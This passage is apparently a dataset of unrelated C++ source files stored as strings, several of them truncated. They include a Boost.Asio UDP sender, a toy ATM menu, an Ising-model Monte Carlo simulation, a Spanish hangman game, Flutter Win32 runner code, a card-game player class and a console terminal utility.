0;\n\t\t}\n\n\t\tpo::notify(vm);\n\t}\n\tcatch (po::error& e) {\n\t\tstd::cerr << \"ERROR: \" << e.what() << std::endl << std::endl;\n\t\tstd::cerr << desc << std::endl;\n\t\treturn 0;\n\t}\n\n\t// UDP server\n\ttry\n    {\n        boost::asio::io_context io_context;\n        udp::resolver resolver(io_context);\n        std::cout << \"Server: \" << bindAddr << \" Port: \" << serverPort << std::endl;\n        udp::endpoint receiver_endpoint =\n          *resolver.resolve(udp::v4(), bindAddr, serverPort).begin();\n        udp::socket socket(io_context);\n        socket.open(udp::v4());\n\n        VelocityControllerMessage msg;\n        msg.v_vertical = 10.0;\n        msg.v_horizontal = 20.0;\n        msg.v_fwd = -0.01;\n        msg.thetadot_horizontal = 0.023;\n        msg.thetadot_vertical = -0.497;\n        msg.btnA = false;\n        msg.btnB = true;\n        msg.btnX = false;\n        msg.btnY = true;\n\n        std::cout << msg << std::endl;\n\n        if( USE_JSON_STR )\n        {\n            std::string jstr = msg.to_json();\n            socket.send_to(boost::asio::buffer(jstr), receiver_endpoint);\n            std::cout << \"Sent the message as json\" << std::endl;\n            std::cout << jstr << std::endl;\n        }\n        else\n        {\n            std::ostringstream ssout;\n            ssout << msg;\n            std::cout << ssout.str() << std::endl;\n            std::string send_buf(ssout.str());\n            socket.send_to(boost::asio::buffer(send_buf), receiver_endpoint);\n            std::cout << \"Sent the message\" << std::endl;\n        }\n    }\n    catch (std::exception& e)\n    {\n        std::cerr << e.what() << std::endl;\n    }\n\n\n\treturn 0;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\ndouble balance = 1000;\r\nint deposit, withDraw = 0;\r\nint passWord;\r\nint choice;\r\n\r\nvoid display()\r\n{\r\n  cout << \"***************\\n\";\r\n  cout << \"***** ATM *****\\n\";\r\n  cout << \"***************\\n\";\r\n  cout << \"***** Menu ****\\n\";\r\n  cout << \"1: Balance\\n\";\r\n  cout << \"2: WithDraw\\n\";\r\n  cout << \"3: Deposit\\n\";\r\n  cout << \"4: Exit\\n\";\r\n  cout << \"****************\\n\";\r\n}\r\n\r\nvoid process()\r\n{\r\n  cout << \"Enter Your Password\\n\";\r\n  cin >> passWord;\r\n\r\n  do{\r\n    if (passWord == 1234)\r\n    {\r\n      cout << \"Enter Your Choice\\n\";\r\n      cin >> choice;\r\n\r\n      switch (choice)\r\n      {\r\n      case 1:\r\n        cout << \"Your Balance is \" << balance << \"\\n\";\r\n        break;\r\n      case 2:\r\n        cout << \"Note: Your Balance is \" << balance << \"\\n\";\r\n        cout << \"Enter Your Amount: \";\r\n        cin >> withDraw;\r\n        if (withDraw > balance)\r\n        {\r\n          cout << \"Sorry You Can't Withdraw This Amount\\n\";\r\n        }\r\n        else\r\n        {\r\n          balance -= withDraw;\r\n          cout << \"Now Your Balance is \" << balance << \"\\n\";\r\n        }\r\n        break;\r\n      case 3:\r\n        cout << \"Your Balance is \" << balance << \"\\n\";\r\n        cout << \"Enter Your Deposit Money: \\n\";\r\n        cin >> deposit;\r\n        balance += deposit;\r\n        cout << \"Now Your Balance is \" << balance << \"\\n\";\r\n        break;\r\n      case 4:\r\n        cout << \"Thank You\\n\";\r\n        break;\r\n      }\r\n    } \r\n    else \r\n    {\r\n      char option = 'o';\r\n      cout << \"Password Is Incorrect, If You Want To Try Again ? Enter [Y] For Yes Or [N] For No\\n\";\r\n      cin >> option;\r\n\r\n      if (option == 'Y' || option == 'y') \r\n      {\r\n        cout << \"Enter Your Password\\n\";\r\n        cin >> passWord;\r\n      }\r\n      else choice = 4;\r\n    }\r\n  } while (choice < 4); \r\n}\r\n\r\nint main()\r\n{\r\n  display();\r\n  process();\r\n\r\n  return 0;\r\n}",
    "#include <alps/params/convenience_params.hpp>\n#include \"2DRBI.hpp\"\n\n// Defines the parameters for the ising simulation\nvoid ising_sim::define_parameters(parameters_type & parameters) {\n    // If the parameters are restored, they are already defined\n    if (parameters.is_restored()) {\n        return;\n    }\n    // Adds the parameters of the base class\n    Base::define_parameters(parameters);\n    alps::define_convenience_parameters(parameters)\n        .description(\"square lattice 2D RBI model simulation\")                                                           \n        .define<int>(\"L\", 24, \"linear size in x direction\")                                                         \n        // Monte Carlo parameters                                                                         \n        .define<int>(\"total_sweeps\", 0, \"max sweeps (0 means indefinite); need to be specfied in tksvm\")\n        .define<int>(\"thermalization_sweeps\", 1000, \"number of sweeps for thermalization\")\n        .define<int>(\"measuring_sweeps\", 10, \"number of sweeps between measurements\")\n        .define<int>(\"pt_sweeps\", 10, \"number of sweeps between PT updates\")\n        .define<int>(\"N_replica\", 1, \"Number of replicas simulated\")\n        .define<double>(\"disorder\", 1, \"Probability of J_<i,j> and K_<i,j> being inverted(0.5 for maximal disorder)\")\n        .define<int>(\"N_avg_p\", 1, \"Number of different realizations of the disordered system\")        \n        .define<int>(\"NBins\", 1000, \"Number of bins used by energy histogram\")\n        .define<double>(\"sampling_range_a\", 0, \"sampling control; lower bound\")\n        .define<double>(\"sampling_range_b\", 0.1, \"sampling control; upper bound\")\n        .define<std::string>(\"orders\", \"Energy;\", \"orders to measure, the ';' needed\")\n        .define<std::string>(\"initial_state\", \"Random\", \"determine initial configuration\");\n    phase_space_point::temperature::define_parameters(parameters);\n}\n\n// Creates a new simulation.\n// We always need the parameters and the seed as we need to pass it to\n// the alps::mcbase constructor. We also initialize our internal state,\n// mainly using values from the parameters.\nising_sim::ising_sim(parameters_type & parms, std::size_t seed_offset)\n    : Base(parms, seed_offset)\n    , rng(parameters[\"SEED\"].as<std::size_t>() + seed_offset)\n    , rng2(parameters[\"SEED\"].as<std::size_t>() + seed_offset)\n    , L(parameters[\"L\"])\n    , lat_sites( ((L+1) * (L-1)) / 2 )         // Given TC in rotated formalism of size L, the lattice of interest for the RBI takes this form\n    , lat(L)\n    , op_measure(L)\n    , sweeps(0) //current sweep\n    , total_sweeps(parameters[\"total_sweeps\"])\n    , thermalization_sweeps(parameters[\"thermalization_sweeps\"])\n    , measuring_sweeps(parameters[\"measuring_sweeps\"])\n    , pt_sweeps(parameters[\"pt_sweeps\"])\n    , temp(parameters)\n    , N_replica(5)\n    , p(parameters[\"disorder\"].as<double>())\n    , J_x(lat_sites + 2*L)\n    , J_y(lat_sites + 2*L)\n    , NBins(parameters[\"NBins\"])\n    , sampling_range_a(parameters[\"sampling_range_a\"].as<double>())\n    , sampling_range_b(parameters[\"sampling_range_b\"].as<double>())\n    , random_site(0, lat_sites - 1)\n    , rand_L(0, L-1)\n    , orders(parameters[\"orders\"].as<std::string>())\n    , initial_state(parameters[\"initial_state\"].as<std::string>())\n{\n    \n\n    S.resize(std::size_t(lat_sites));\n\n    initialization(initial_state);\n\n    simdir = \"../L_5/p_0.000/even/Seed_0/\";\n\n    std::ifstream Tp_points(simdir + \"T-p_points.data\");\n    int Nreps = parameters[\"N_replica\"];\n    T_vec.resize(Nreps+1);\n    p_vec.resize(Nreps+1);\n    time_in_Ti.resize(Nreps+1);\n    for (int i=0; i<T_vec.size(); i++){\n        Tp_points >> T_vec[i];\n        Tp_points >> p_vec[i];\n    }\n    Tp_points.close();\n\n\n    //PT ACCEPTANCE RATIO\n    measurements() << alps::accumulators::FullBinningAccumulator<double>(\"Acceptance\");\n\n    // likelihood of having even boundary conditions (complementary is odd)\n//    measurements() << alps::accumulators::FullBinningAccumulator<double>(\"is_even\");\n\n    op_names = parsing_op(orders);\n    for (std::string op : op_names){\n        measurements()\n        << alps::accumulators::FullBinningAccumulator<double>(op)\n        << alps::accumulators::FullBinningAccumulator<double>(op + \"^2\")\n        << alps::accumulators::FullBinningAccumulator<double>(op + \"^4\")\n        << alps::accumulators::MeanAccumulator<std::vector<double>>(op + \"_Hist\");\n    }\n}\n\n\nvoid ising_sim::update() {\n    //Loading p-value given T, importing the bond configuration and, if necessary, import spin configuration\n    if (sweeps == 0){\n\n        std::ifstream PTvalue(simdir + \"PTval.txt\");\n        PTvalue >> PTval;\n        PTvalue.close();\n\n        T=temp.temp;     //Each replica starts at a given T,p\n        up = true;      \n        auto it = std::find(T_vec.begin(), T_vec.end(), temp.temp);\n        ind = std::distance( T_vec.begin(), it);    //ind contains the index of the current T-p point\n        N_core = ind;\n        \n        p = p_vec[ind]",
    "#include <iostream>\n#include <cstdlib> // Para la funci\u00f3n system\n#include <ctime>   // Para la funci\u00f3n time\n\n// La siguiente l\u00ednea indica que se utilizar\u00e1n todos los elementos del espacio de nombres std\nusing namespace std;\n\n//Funciones\nvoid LimpiarPantalla();\nvoid JugarPartida();\nvoid Dibujar();\n\n//Variables\n//Variable para elegir opcion del menu\nchar eleccion;\n//Palabras del juego\nstring palabras[] = {\"monitor\",\"microfono\",\"televisor\",\"telefono\",\"caja\",\"fibron\",\"teclado\",\"pc\",\"collar\",\"manzana\"};\n//Palabra a jugar\nstring palabra;\n//Letras falladas\nstring letrasFalladas;\n//Numero aleatorio\nint nA;\n//Vida del jugador\nint vida;\n//Letra correcta\nbool correcta;\n//Palabra se completo\nbool completa;\n\n//Metodo principal\nint main(){\n    //Menu\n    while(true){\n        //vida del juego\n        vida = 6;\n\n        //Sin palabra de juego\n        palabra = \"\";\n\n        //Sin letras falladas\n        letrasFalladas = \"\";\n\n        //Limpiar la pantalla\n        LimpiarPantalla();\n\n        //Menu del juego\n        cout<<\"\\t::::MENU::::\"<<endl;\n        cout<<\"1) JugarPartida.\"<<endl;\n        cout<<\"2) Salir.\"<<endl;\n        cout<<\"Eleccion: \";\n\n        //Guarda eleccion\n        cin>>eleccion;\n\n        //Eleccion del menu\n        switch(eleccion){\n            //Juego\n            case '1':\n                //Partida de juego\n                JugarPartida();\n                break;\n            //Salir\n            case '2':\n                //Salir\n                return 0;\n                break;\n        }\n    }\n}\n\n//Funcion para jugar partida\nvoid JugarPartida(){\n    //Generar semilla\n    srand((int)time(NULL));\n\n    //Generar numero a partir de la cantidad de palabras\n    nA = rand()%10;\n\n    //Tama\u00f1o de la palabra\n    for(int i = 0; i < (int)palabras[nA].size(); i++){\n        palabra += \"-\";\n    }\n\n    //Partida en curso\n    while(vida > 0){\n        //Limpiar pantalla\n        LimpiarPantalla();\n\n        //Titulo\n        cout<<\"\\t::: A H O R C A D O :::\"<<endl;\n\n        //Cuerpo\n        Dibujar();\n\n        //Letras falladas\n        cout<<\"Fallos: \"<<letrasFalladas;\n\n        //Progreso de juego\n        cout<<\"    Progreso: \"<<palabra<<endl;\n\n        //Ingresa letra\n        cout<<\"Ingrese una letra(minuscula): \";\n\n        //Guardar letra\n        cin>>eleccion;\n\n        //Letra no es correcta\n        correcta = false;\n\n        //Encontrar si la letra forma parte de la palabra\n        for(int i = 0; i < (int)palabras[nA].size(); i++){\n            if(palabras[nA][i] == eleccion){\n                //Letra de la palabra es igual a la letra dada\n                palabra[i] = eleccion;\n                //Letra es correcta\n                correcta = true;\n            }\n        }\n\n        //Letra no es correcta\n        if(!correcta){\n            //Pierde una vida\n            vida--;\n            //Letras falladas\n            letrasFalladas += eleccion;\n        }\n\n        //Palabra se completo\n        completa = true;\n        for(int i = 0; i < (int)palabra.size(); i++){\n            //Palabra no se completo\n            if(palabra[i] == '-'){\n                completa = false;\n            }\n        }\n        if(completa){\n            //Limpiar la pantalla\n            LimpiarPantalla();\n\n            //Titulo\n            cout<<\"\\t::: A H O R C A D O :::\"<<endl;\n\n            //Cuerpo\n            Dibujar();\n\n            //Palabra completada\n            cout<<\"Palabra: \"<<palabras[nA]<<endl;\n\n            //Mensaje ganador e ingese un caracter para continuar\n            cout<<\"Ganaste. Ingresa un caracter para continuar: \";\n\n            //Guardar caracter\n            cin>>eleccion;\n\n            //Salir de la funcion\n            return;\n        }\n    }\n\n    //Limpia la pantalla\n    LimpiarPantalla();\n\n    //Titulo\n    cout<<\"\\t::: A H O R C A D O :::\"<<endl;\n\n    //Cuerpo\n    Dibujar();\n\n    //Palabra completa\n    cout<<\"Palabra: \"<<palabras[nA]<<endl;\n\n    //Mensaje perdedor e ingese un caracter para continuar\n    cout<<\"Perdiste. Ingresa un caracter para continuar: \";\n\n    //Guardar caracter\n    cin>>eleccion;\n\n    //Salir de la funcion\n    return;\n}\n\n//Funcion del cuerpo\nvoid Dibujar(){\n    switch(vida){\n        //Sin cuerpo\n        case 6:\n            cout<<\"  ........\"<<endl;\n            cout<<\"  |      |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\" ---\"<<endl;\n            break;\n        //Cabeza del cuerpo\n        case 5:\n            cout<<\"  ........\"<<endl;\n            cout<<\"  |      |\"<<endl;\n            cout<<\"  |      O\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\"  |\"<<endl;\n            cout<<\" ---\"<<endl;\n            break;\n        //Cabeza y torzo del cuerpo\n        case 4:\n            cout<<\"  ........\"<<endl;\n            cout<<\"  |      |\"<<endl;\n            cout<<\"  |      O\"<<endl;\n            cout<<\"  |      |\"<<endl;\n        ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bmi_cal\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"player.hpp\"\n#include \"utilities.hpp\"\n\n#include <queue>\n#include <vector>\n\nPlayer::Player() {\n  /// @brief Default constructor for Player\n\n  Utilities::Debug(\"Player constructor called\");\n  hand = std::make_unique<Hand>();\n  cardsLeft = std::set<int>();\n  for (int i = 0; i < 54; i++) {\n    cardsLeft.insert(i);\n  }\n}\n\nPlayer::Player(std::string name) {\n  /// @brief Constructor for Player with name\n  /// @param name Name of the player\n\n  this->name = name;\n  Utilities::Debug(\"Player constructor called\");\n  Utilities::Debug(\"My name is \" + this->name);\n\n  hand = std::make_unique<Hand>();\n  cardsLeft = std::set<int>();\n  for (int i = 0; i < 54; i++) {\n    cardsLeft.insert(i);\n  }\n}\n\nPlayer::Player(std::unique_ptr<Player>& player_) {\n  /// @brief Copy constructor for Player\n  /// @param player_ Player to copy\n\n  Utilities::Debug(\"Player copy constructor called\");\n  this->name = player_->name;\n  std::unique_ptr<Hand> hand_(new Hand(player_->hand));\n  this->hand = std::move(hand_);\n  this->tricks = player_->tricks;\n  this->jokers = player_->jokers;\n  this->cardsLeft = player_->cardsLeft;\n  this->numCardsLeft = player_->numCardsLeft;\n  this->playOrder = player_->playOrder;\n}\n\nPlayer::~Player() {\n  /// @brief Destructor for Player\n  Utilities::Debug(\"Player destructor called\");\n}\n\nvoid Player::addCard(int card) {\n  /// @brief Add card to player's hand\n  /// @param card Card to add\n\n  if (card > 53 || card < 0) {\n    throw std::invalid_argument(\"Invalid card\");\n  }\n  Utilities::Debug(\"Adding card to hand \" + std::to_string(card));\n  if (card == 52 || card == 53) {\n    hand->jokerAvailable = true;\n    this->jokers++;\n  } else {\n    int suit = card / 13;\n    int value = card % 13;\n    if (value == 0) {\n      hand->cards[suit][0] += 1;\n      hand->cards[suit][13] += 1;\n    } else {\n      hand->cards[suit][value] += 1;\n    }\n  }\n  playOrder.push_back(card);\n  cardsLeft.erase(card);\n}\n\nint Player::turn(std::unique_ptr<Hand>& handV, int tricksV, int jokersV, int numCardsLeftV) {\n  /// @brief Player's turn\n  /// @param handV Opponent's hand\n  /// @param tricksV Opponent's tricks\n  /// @param jokersV Opponent's jokers\n  /// @param numCardsLeftV Opponent's cards left\n  /// @return 1 if player should yield, 0 if player should play\n\n  int yield = 0;\n  if (cardsLeft.size() < 1) {\n    return 1;\n  }\n  if (this->shouldPlay(handV, tricksV, jokersV, numCardsLeftV) == 1) {\n    while (this->hand->value < handV->value) {\n      yield = this->playCard();\n      if (yield == 1) {\n        break;\n      }\n      Utilities::Debug(\"Card played\");\n      evaluateHand(this->hand);\n      printHand(this->hand->value);\n    }\n  } else {\n    yield = 1;\n  }\n  return yield;\n}\n\nint Player::shouldPlay(std::unique_ptr<Hand>& handV, int tricksV, int jokersV, int numCardsLeftV) {\n  /// @brief Determine if player should play\n  /// @param handV Opponent's hand\n  /// @param tricksV Opponent's tricks\n  /// @param jokersV Opponent's jokers\n  /// @param numCardsLeftV Opponent's cards left\n  /// @return 1 if player should yield, 0 if player should play\n\n  // HELLA CRAZY MCTS AND AI STUFF\n  return 1;\n}\n\nint Player::playCard() {\n  /// @brief Play a card\n  /// @return 1 if player should yield, 0 if player should play\n\n  if (cardsLeft.size() < 1) {\n    return 1;\n  }\n  std::vector<int> cardsLeftVector = std::vector<int>(cardsLeft.begin(), cardsLeft.end());\n  std::srand(static_cast<unsigned int>(std::time(nullptr) + rand()));\n  int card = std::rand() % cardsLeft.size();\n  Utilities::Debug(this->name + \": \" + std::to_string(cardsLeft.size()) + \" Cards Left\");\n  this->addCard(cardsLeftVector[card]);\n  this->printCard(cardsLeftVector[card]);\n\n  return 0;\n}\n\nvoid Player::resetHand() {\n  /// @brief Reset player's hand\n\n  this->hand.reset();\n  this->hand = std::make_unique<Hand>();\n  playOrder = std::vector<int>();\n}\n\nvoid Player::printCard(int card) {\n  /// @brief Print card\n  /// @param card Card to print\n\n  if (card == 52) {\n\n    Utilities::Debug(\"JokerA 52\");\n    return;\n  } else if (card == 53) {\n    Utilities::Debug(\"JokerB 53\");\n    return;\n  }\n\n  int suit = (card) / 13;\n  int value = (card) % 13;\n  std::string suits[4] = {\"c\", \"d\", \"h\", \"s\"};\n  std::string values[13] = {\"A\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"J\", \"Q\", \"K\"};\n\n  Utilities::Debug(values[value] + suits[suit] + \" \" + std::to_string(card));\n}\n\nstd::string Player::printHand(std::vector<int> hand) {\n  /// @brief Print hand\n  /// @param hand Hand to print\n\n  std::string ret;\n\n  int h = hand[0];\n  std::string values[10] = {\"High Card\", \"Pair\",       \"Two Pair\",       \"Three of a Kind\", \"Straight\",\n                            \"Flush\",     \"Full House\", \"Four of a Kind\", \"Straight Flush\",  \"Quint\"};\n\n  Utilities::Debug(values[h] + \" \");\n  ret += values[h] + \" \";\n  for (int i = 1; i < hand.size(); i++) {\n    ret += std::to_string(hand[i]) + \" \";\n\n    Utilities::Debug(std::to_string(hand[i]));\n  }\n  return ret;\n}\n\nstd::vector<int> Player::evaluateHand() {\n  return evaluateHand(this->hand);\n}\nstd::v",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//\n// ZeeTerminalCore.cpp - Contains all function definitions of the ZeeTerminal Core.\n//\n\n#include <string>\n#include <iostream>\n#include <random>\n#include <codecvt>\n#include \"ZTFormattingDefinitions.h\"\n#include \"ZTConstDefinitions.h\"\n#include <Windows.h>\n#include <conio.h>\n#include <thread>\n#include \"ZeeTerminalCore.h\"\n\n// Define all core ZeeTerminal global variables\nbool\t\t\t\t\tbAnsiVTSequences = true;\nbool\t\t\t\t\tbConfigAndLogSystemsInitialised = false; // Switch to symbolise that the config and log systems have been initialised\nbool\t\t\t\t\tbDisp = true; // Switch for showing the start command screen (\"Command: > \"), similar to CMD's @echo off. \nstd::string\t\t\t\tsCommandInputRAW = \"\";\nstd::string\t\t\t\tsStringOptionCommandArgs[nArgArraySize]; // Made global because you can't pass an std::string array into a function, therefore Commands() wouldn't work properly\n// on multi-argument commands.\nstd::string\t\t\t\tsStringDataCommandArgs[nArgArraySize]; // Made global because you can't pass an std::string array into a function, therefore Commands() wouldn't work properly\n// on multi-argument commands.\nuint64_t\t\t\t\tnNumOfInputtedCommands = 0; // Counter for number of inputted commands since the start of the ZeeTerminal session.\nuint64_t\t\t\t\tnNumOfSuccessfulInputtedCommands = 0; // Counter for number of successful inputted commands since the start of the ZeeTerminal session.\n\nstd::string\t\t\t\tsLastColourFore = \"\"; // Last set colour of any kind - foreground\nstd::string\t\t\t\tsLastColourBack = \"\"; // Last set colour of any kind - background\n\n// Configuration\nstd::string sColourGlobal = LWHT;\nstd::string sColourGlobalBack = BLK;\n\nstd::string sColourHighlight = LWHT;\nstd::string sColourHighlightBack = BLU;\n\nstd::string sColourTitle = BLK;\nstd::string sColourTitleBack = LCYN;\n\nstd::string sColourSubheading = LWHT;\nstd::string sColourSubheadingBack = MAG;\n\nbool bDisplayDirections = true;\nbool bDisplayVerboseMessages = false;\nbool bRandomColoursOnStartup = false;\nbool bShowCursor = true;\nbool bWordWrapToggle = true;\nbool bCursorBlink = true;\nbool bTermCustomThemeSupport = false;\nbool bAutoReadableContrast = true;\nbool bUseNewOptionSelect = true;\n\n// LogFile System Settings\nbool bEnableLogging = false;\nbool bVerboseMessageLogging = true;\nbool bUserSpaceErrorLogging = false;\nbool bCommandInputInfoLogging = true;\nbool bUserInputInfoLogging = false;\n\nlong long int nSlowCharSpeed = 32;\nlong long int nCursorShape = 5; // TYPES are: block blinking (1), block steady (2), underline blinking (3), underline steady (4), bar blinking (5), bar steady (6)\n\n\n\nnamespace zt {\n\n\t// Sets cursor attributes automatically when called\n\tvoid SetCursorAttributes() {\n\n\t\t// Can't do without ANSI VT sequences\n\t\tif (bAnsiVTSequences) {\n\t\t\t// Set cursor shape\n\t\t\tstd::cout << \"\\x1b[\" << nCursorShape << \" q\";\n\n\t\t\t// Set cursor blink\n\t\t\tif (bCursorBlink == true) {\n\t\t\t\tstd::cout << \"\\x1b[?12h\";\n\t\t\t}\n\t\t\telse std::cout << \"\\x1b[?12l\";\n\n\t\t\t// Set cursor visibility\n\t\t\tif (bShowCursor == true) {\n\t\t\t\tstd::cout << \"\\x1b[?25h\";\n\t\t\t}\n\t\t\telse std::cout << \"\\x1b[?25l\";\n\n\t\t}\n\n\t\t// Non-ANSI terminals\n\t\telse {\n\t\t\t// Set cursor visibility using the WIN32 Console API\n\t\t\tCONSOLE_CURSOR_INFO cciAttribSet;\n\t\t\tGetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cciAttribSet);\n\n\t\t\t// Set variables\n\t\t\tif (bShowCursor == true) {\n\t\t\t\tcciAttribSet.bVisible = true;\n\t\t\t}\n\t\t\telse cciAttribSet.bVisible = false;\n\n\t\t\t// Set final cursor info\n\t\t\tSetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cciAttribSet);\n\t\t}\n\n\t\treturn;\n\t}\n\n\t// Sets the colour and background colour\n\tvoid colour(std::string sColourForegroundChoice, std::string sColourBackgroundChoice) {\n\n\t\t// Set colours to their respective last colours\n\t\tsLastColourFore = sColourForegroundChoice;\n\t\tsLastColourBack = sColourBackgroundChoice;\n\n\t\tif (bAnsiVTSequences) {\n\n\t\t\t// Maintain a readable contrast if the setting is set to true\n\t\t\tif (bAutoReadableContrast == true) {\n\t\t\t\t// To keep contrast good\n\t\t\t\tif (sColourForegroundChoice == sColourBackgroundChoice) {\n\t\t\t\t\tif (sColourBackgroundChoice == BLK\n\t\t\t\t\t\t|| sColourBackgroundChoice == RED\n\t\t\t\t\t\t|| sColourBackgroundChoice == GRN\n\t\t\t\t\t\t|| sColourBackgroundChoice == YLW\n\t\t\t\t\t\t|| sColourBackgroundChoice == BLU\n\t\t\t\t\t\t|| sColourBackgroundChoice == MAG\n\t\t\t\t\t\t|| sColourBackgroundChoice == CYN)\n\t\t\t\t\t{\n\t\t\t\t\t\tsColourForegroundChoice = LWHT;\n\t\t\t\t\t}\n\t\t\t\t\telse if (sColourBackgroundChoice == GRAY\n\t\t\t\t\t\t|| sColourBackgroundChoice == LRED\n\t\t\t\t\t\t|| sColourBackgroundChoice == LGRN\n\t\t\t\t\t\t|| sColourBackgroundChoice == LYLW\n\t\t\t\t\t\t|| sColourBackgroundChoice == LBLU\n\t\t\t\t\t\t|| sColourBackgroundChoice == LMAG\n\t\t\t\t\t\t|| sColourBackgroundChoice == LCYN\n\t\t\t\t\t\t|| 